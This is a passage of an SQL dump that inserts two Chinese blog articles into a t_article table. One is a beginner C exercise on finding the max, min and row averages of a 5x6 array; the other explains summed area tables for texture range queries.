INSERT INTO `t_article` VALUES (51, 'c语言精选试题----数组', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-light\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>笔者以c语言为入门语言，今天敲c++时觉得跟c有许多相似之处，所以笔者打算开一个小的c语言例题整理，整理一些比较好的题目，供大家学习，代码不是抄袭而来，是笔者自己所敲或者请教的朋友进行优化，希望c语言的入门者们闲暇之余，可以浏览思考，有什么问题欢迎留言或者私信。</p> \n <h2><a id=\"_2\"></a>数组</h2> \n <p>eg.<strong>定义1个二维数组：<strong>int arr[5][6]</strong>，然后从键盘输入5行6列共30个整数，编程求出所有元素中的最大值、最小值及其下标，同时求出每行元素的平均值，并在屏幕上打印输出。<br> 提示：在一个二重循环体内用scanf函数输入30个数，然后再用一个二重循环处理数据处理。</strong></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611004415423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjYwNTE1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <pre><code class=\"prism language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n	<span class=\"token keyword\">int</span> arr<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">double</span> sum<span class=\"token operator\">=</span><span class=\"token number\">0.0</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">double</span> Ave<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n	<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"输入5*6的矩阵：\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">int</span> i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">;</span>\n	<span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>b <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//赋值 </span>\n	<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n	<span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n		<span class=\"token punctuation\">{\n    <!-- --></span>\n			<span class=\"token function\">scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n	 <span class=\"token punctuation\">}</span> \n	 <span class=\"token keyword\">int</span> max<span class=\"token punctuation\">;</span>\n	 max<span class=\"token operator\">=</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n	 <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//循环4次就可以 </span>\n	 <span class=\"token punctuation\">{\n    <!-- --></span>\n	 	<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n	 	<span class=\"token punctuation\">{\n    <!-- --></span>\n	 		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span>max<span class=\"token punctuation\">)</span>\n	 		<span class=\"token punctuation\">{\n    <!-- --></span>\n	 			max<span class=\"token operator\">=</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n	 			a <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">//坐标赋值 </span>\n				b <span class=\"token operator\">=</span> j<span class=\"token punctuation\">;</span>  \n			 <span class=\"token punctuation\">}</span>\n		 <span class=\"token punctuation\">}</span>\n		\n	 <span class=\"token punctuation\">}</span> \n	 <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"arr[%d][%d]是最大值%d\\n\"</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	 a <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//归零 </span>\n	 b <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>  \n	 <span class=\"token keyword\">int</span> min<span class=\"token punctuation\">;</span>\n	 min<span class=\"token operator\">=</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n	 <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//同上 , 两个循环其实可以放在一起 </span>\n	 <span class=\"token punctuation\">{\n    <!-- --></span>\n	 	<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n	 	<span class=\"token punctuation\">{\n    <!-- --></span>\n	 		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>min<span class=\"token punctuation\">)</span>\n	 		<span class=\"token punctuation\">{\n    <!-- --></span>\n	 			min<span class=\"token operator\">=</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n	 			a <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">//同上 </span>\n	 			b <span class=\"token operator\">=</span> j<span class=\"token punctuation\">;</span> \n			 <span class=\"token punctuation\">}</span>\n		 <span class=\"token punctuation\">}</span>\n	 <span class=\"token punctuation\">}</span> \n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"arr[%d][%d]是最小值%d\\n\"</span><span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>min<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	 <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n	 <span class=\"token punctuation\">{\n    <!-- --></span>\n	 	 <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n	 	<span class=\"token punctuation\">{\n    <!-- --></span>\n		 	<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n		 	<span class=\"token punctuation\">{\n    <!-- --></span>\n		 		sum<span class=\"token operator\">=</span>sum<span class=\"token operator\">+</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n		  	<span class=\"token punctuation\">}</span> \n		 	Ave<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>sum<span class=\"token operator\">/</span><span class=\"token number\">6.0</span><span class=\"token punctuation\">;</span>\n		  	<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Ave[0]=%.2f\\n\"</span><span class=\"token punctuation\">,</span>Ave<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> \n       <span class=\"token punctuation\">{\n    <!-- --></span>\n       	sum<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	   <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n		 <span class=\"token punctuation\">{\n    <!-- --></span>\n		 	sum<span class=\"token operator\">=</span>sum<span class=\"token operator\">+</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n		  <span class=\"token punctuation\">}</span> \n		  Ave<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>sum<span class=\"token operator\">/</span><span class=\"token number\">6.0</span><span class=\"token punctuation\">;</span>\n		  	<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Ave[1]=%.2f\\n\"</span><span class=\"token punctuation\">,</span>Ave<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n       <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n       <span class=\"token punctuation\">{\n    <!-- --></span>\n       	sum<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	   <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n		 <span class=\"token punctuation\">{\n    <!-- --></span>\n		 	sum<span class=\"token operator\">=</span>sum<span class=\"token operator\">+</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n		  <span class=\"token punctuation\">}</span> \n		  Ave<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>sum<span class=\"token operator\">/</span><span class=\"token number\">6.0</span><span class=\"token punctuation\">;</span>\n		  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Ave[2]=%.2f\\n\"</span><span class=\"token punctuation\">,</span>Ave<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n        sum<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n		 <span class=\"token punctuation\">{\n    <!-- --></span>\n		 	sum<span class=\"token operator\">=</span>sum<span class=\"token operator\">+</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n		  <span class=\"token punctuation\">}</span> \n		  Ave<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>sum<span class=\"token operator\">/</span><span class=\"token number\">6.0</span><span class=\"token punctuation\">;</span>\n		  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Ave[3]=%.2f\\n\"</span><span class=\"token punctuation\">,</span>Ave<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n        	sum<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n	    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n		 <span class=\"token punctuation\">{\n    <!-- --></span>\n		 	sum<span class=\"token operator\">=</span>sum<span class=\"token operator\">+</span>arr<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n		  <span class=\"token punctuation\">}</span> \n		  Ave<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>sum<span class=\"token operator\">/</span><span class=\"token number\">6.0</span><span class=\"token punctuation\">;</span>\n	<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Ave[4]=%.2f\\n\"</span><span class=\"token punctuation\">,</span>Ave<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n	 	<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">5</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n	<span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n		<span class=\"token punctuation\">{\n    <!-- --></span>\n			<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" %6d \"</span><span class=\"token punctuation\">,</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n		<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n	 <span class=\"token punctuation\">}</span> \n	<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n\n</code></pre> \n <p>运行结果<br> <img src=\"https://img-blog.csdnimg.cn/20210611004802853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjYwNTE1Ng==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 有问题私聊博主或者在下面留言，如果有更好的解法也请留言，欢迎大家讨论，共同进步，一起学习。</p> \n <p><strong>“<strong>c语言是最美的语言，c语言让我遇见了这个世界的美好。</strong>”</strong></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (52, 'Games202 Lecture3-4之SAT: Summed Area Table', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"toc\"> \n  <h3>SAT: Summed Area Table</h3> \n  <ul>\n   <li><a href=\"#_8\">一维</a></li>\n   <li><a href=\"#_20\">二维</a></li>\n   <li><a href=\"#_40\">分析</a></li>\n  </ul> \n </div> \n <p></p> \n <p><em>一种可以准确进行范围查询的方式。</em></p> \n <p>数据结构： <strong>Summed Area Table (SAT)</strong><br> 算法：<strong>prefix sum 前缀和</strong></p> \n <h1><a id=\"_8\"></a>一维</h1> \n <p>对于一个存放texture的一维数组，构建一个等大的summed area table，这个table中每个元素的值是texture数组中该位置元素以及其左侧所有元素的总和。<br> <span class=\"katex--display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"> S A T ( i ) = ∑ j ≤ i T e x t u r e ( j ) SAT(i) = \\sum_{\\mathclap{j\\le i}} Texture(j) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">i</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 2.46378em; vertical-align: -1.41378em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 1.05001em;\"><span class=\"\" style=\"top: -1.87233em; margin-left: 0em;\"><span class=\"pstrut\" style=\"height: 3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.65952em;\"><span class=\"\" style=\"top: -2.7em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"clap mtight\"><span class=\"strut\" style=\"height: 0.85396em; vertical-align: -0.19444em;\"></span><span class=\"inner mtight\"><span class=\"\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right: 0.05724em;\">j</span><span class=\"mrel mtight\">≤</span><span class=\"mord mathdefault mtight\">i</span></span></span></span><span class=\"fix\"></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.19444em;\"><span class=\"\"></span></span></span></span></span></span></span></span><span class=\"\" style=\"top: -3.05em;\"><span class=\"pstrut\" style=\"height: 3.05em;\"></span><span class=\"\"><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 1.41378em;\"><span class=\"\"></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\">e</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right: 0.05724em;\">j</span><span class=\"mclose\">)</span></span></span></span></span></span><br> 示意：<br> <img src=\"https://img-blog.csdnimg.cn/20210611231652902.png#pic_center\" alt=\"\"><br> 在(a,b]范围内元素和的计算方式：<br> <span class=\"katex--display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"> R Q ( ( a , b ] ) = S A T ( b ) − S A T ( a ) RQ((a,b]) = SAT(b) - SAT(a) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.00773em;\">R</span><span class=\"mord mathdefault\">Q</span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">a</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mclose\">]</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">b</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right: 0.222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">a</span><span class=\"mclose\">)</span></span></span></span></span></span></p> \n <h1><a id=\"_20\"></a>二维</h1> \n <p>对于一个存放texture的二维数组，构建一个等大的summed area table。<br> 每个元素的值记录的是texture数组中该元素以及其左侧和上方的所有元素的总和。<br> <span class=\"katex--display\"><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"> S A T ( x , y ) = ∑ x ′ ≤ x , y ′ ≤ y T e x t u r e ( x ′ , y ′ ) SAT(x,y)=\\sum_{x\'\\le x, y\'\\le y} Texture(x\',y\') </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.05764em;\">S</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 2.4801em; vertical-align: -1.43009em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 1.05001em;\"><span class=\"\" style=\"top: -1.85601em; margin-left: 0em;\"><span class=\"pstrut\" style=\"height: 3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.682829em;\"><span class=\"\" style=\"top: -2.786em; margin-right: 0.0714286em;\"><span class=\"pstrut\" style=\"height: 2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mrel mtight\">≤</span><span class=\"mord mathdefault mtight\">x</span><span class=\"mpunct mtight\">,</span><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right: 0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.682829em;\"><span class=\"\" style=\"top: -2.786em; margin-right: 0.0714286em;\"><span class=\"pstrut\" style=\"height: 2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mrel mtight\">≤</span><span class=\"mord mathdefault mtight\" style=\"margin-right: 0.03588em;\">y</span></span></span></span><span class=\"\" style=\"top: -3.05em;\"><span class=\"pstrut\" style=\"height: 3.05em;\"></span><span class=\"\"><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 1.43009em;\"><span class=\"\"></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.13889em;\">T</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">t</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\" style=\"margin-right: 0.02778em;\">r</span><span class=\"mord mathdefault\">e</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.801892em;\"><span class=\"\" style=\"top: -3.113em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.801892em;\"><span class=\"\" style=\"top: -3.113em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></span></span><br> 示意：<br> <img 